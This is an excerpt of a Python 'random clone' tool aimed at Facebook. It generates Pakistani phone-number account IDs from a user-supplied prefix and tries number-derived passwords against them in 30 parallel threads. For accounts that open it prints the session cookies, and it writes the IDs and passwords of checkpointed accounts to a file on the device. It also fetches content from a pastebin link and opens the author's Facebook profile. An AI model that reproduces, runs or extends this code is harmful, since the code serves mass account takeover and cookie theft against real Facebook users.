...
try:
    ...
    os.system("xdg-openhttps://www.facebook.com/profile.php?id=100003298884615&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/HBTq6Ayf").text
...
os.system('xdg-open https://www.facebook.com/profile.php?id=100003298884615/?ref=share')
...
def xyz():
    ...
    print(f"")
    print(f"{BLUE}[01] {GREEN}𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐄 𝐏𝐀𝐊   ")
    print(f"{BLUE}[00]{RED} 𝐄𝐗𝐈𝐓 𝐏𝐑𝐎𝐆𝐑𝐀𝐌  ")
    print(f"")
    print(f"\033[1;93m========================================================")
    LUQMAN = input("[√] 𝐂𝐇𝐎𝐎𝐒𝐄 : ")
    if LUQMAN in ["1","01"]:
...
def Tabii():
    ...
    print(f"\r\033[1;34m𝟐𝟏𝟖𝟗𝟐, 𝟐𝟏𝟖𝟗𝟒,𝟐𝟏𝟖𝟗𝟏,𝟐𝟏𝟖𝟗𝟑")
    linex()
    code = input(' 𝐏𝐔𝐓 𝐂𝐎𝐃𝐄 : ')
    os.system("clear")
    print(logo)
    ...
    print(f"          \x1b[97m[\033[37;41m 𝑨𝑳𝑩𝑶𝑹𝑯 𝑺𝑻😈  \033[0;m]")
    print(f"")
    limit = int(input('\r\033[1;34m 𝑨𝑳𝑩𝑶𝑹𝑯 𝑺𝑻😈: 𝟓𝟎𝟎𝟎,𝟏𝟎𝟎𝟎𝟎,𝟐𝟎𝟎𝟎𝟎\n\n 𝐏𝐔𝐓 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐋𝐈𝐌𝐈𝐓 : '))
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {BLUE}𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐙              : {GREEN}"+tl)
        print(f" {BLUE}𝐶𝑂𝑈𝑁𝑇𝑅𝑌 𝑌𝑂𝑈 𝐶𝐻𝑂𝑂𝑆𝐸    : {GREEN}PAKISTAN ")
        print(f" {BLUE}𝑁𝑈𝑀b𝐸𝑅 𝑌𝑂𝑈 𝑃𝑈𝑇      : {GREEN}"+code)
        print(f" {BLUE}𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍  𝐒𝐓𝐀𝐑𝐓𝐄𝐃")
        print(f'{YELLOW}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[𝑨𝑳𝑩𝑶𝑹𝑯 𝑺𝑻-𝑂𝐾 𖢍🔥😈]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                ...
                cid=coki[24:39]
                Red = '\033[1;37m'
                print(f'\r{Red}[×]--------------------[ 𝑨𝑳𝑩𝑶𝑹𝑯 𝑺𝑻-𝐂𝐏  𖢑😥]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/𝑨𝑳𝑩𝑶𝑹𝑯 𝑺𝑻-𝐂𝐏 .txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
